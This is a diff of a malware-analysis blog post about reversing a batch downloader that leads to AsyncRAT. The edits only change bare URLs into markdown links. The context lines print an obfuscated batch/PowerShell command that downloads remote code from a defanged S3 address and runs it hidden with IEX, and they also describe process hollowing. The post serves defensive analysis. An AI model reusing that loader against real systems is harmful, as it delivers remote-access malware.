@@ -9,8 +9,7 @@ Here are a few examples / techniques that can be used to reverse and find the co
 
 ## Example 1 - Batch Downloader
 
-Out initial file is taken from:
-https://www.virustotal.com/gui/file/16b4a6fec76b452f77a6832871ff2e906d673e557a0e6c2673fc952181d1319b
+Out initial file is taken from [Virustotal](https://www.virustotal.com/gui/file/16b4a6fec76b452f77a6832871ff2e906d673e557a0e6c2673fc952181d1319b)
 
 This is a fairly simple batch script which contains a lot of garbage Japanese strings, but within these strings there is a variable being defined, and an interesting command line.
 
@@ -22,7 +21,7 @@ This is a fairly simple batch script which contains a lot of garbage Japanese st
 C^M^D.%rHX%X%rHX% /C P^OW%rHX%RSH%rHX%LL.%rHX%X%rHX% -N^O^P -WI^N^D HIDD%rHX%N -%rHX%X%rHX%C B^YPA^SS -NO^NI [BYT%rHX%[]];$vjpi='I%rHX%X(N%rHX%W-OBJ%rHX%CT N%rHX%T.W';$Jzzm='%rHX%BCLI%rHX%NT).DOWNLO';[BYT%rHX%[]];$AYeD='TUUL(''hxxps[://]buckotx.s3.amazonaws[.]com/x.png'')'.R%rHX%PLAC%rHX%('TUUL','ADSTRING');[BYT%rHX%[]];I%rHX%X($vjpi+$Jzzm+$AYeD)
 ```
 
-Similar to our method in the Analysing Obfuscated PowerShell Scripts post, if we set the variable and add an "echo" to before the command line, we are able to deobfuscate the string.
+Similar to our method in the [Analysing Obfuscated PowerShell Scripts](https://mzheader.github.io/2023/11/25/obfuscated-powershell-scripts.html) post, if we set the variable and add an "echo" to before the command line, we are able to deobfuscate the string.
 
 ![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/89a35c56-d8f2-488c-82e2-19d7491efdca)
 
@@ -106,7 +105,7 @@ $Data = '4D5A9@@@@3@@@@@@@4@@@@@@FFFF@@@@B8@@@@@@@@@@@@@@4@@@@@@@@@@@@@@@@@@@@@@
 
 By taking these Hex values, replacing '@' with '0', and downloading to a file, we can analyse the 2 PEs further.
 
-The first file is RunPE, it's used to inject the ASync RAT payload (The second PE) into a legitimate process, via process hollowing (https://attack.mitre.org/techniques/T1055/012/)
+The first file is RunPE, it's used to inject the ASync RAT payload (The second PE) into a legitimate process, via [process hollowing](https://attack.mitre.org/techniques/T1055/012/)
 
 _Interesting strings which indicate process injection / hollowoing (from PEStudio):_
 
@@ -197,7 +196,7 @@ Scroll down and copy this chunk, it is the encrypted configuration information f
 }
 ```
 
-We're going to throw this into CyberChef, and use the recipie from: https://www.securityinbits.com/tools/cyberchef/asyncrat-config-decryption-using-cyberchef-recipe-2/
+We're going to throw this into CyberChef, and use the recipie from this [guide](https://www.securityinbits.com/tools/cyberchef/asyncrat-config-decryption-using-cyberchef-recipe-2/)
 
 The "Key" value which we need is the variable referenced just above the configuration, so we can look for the defined variable in the config.
 
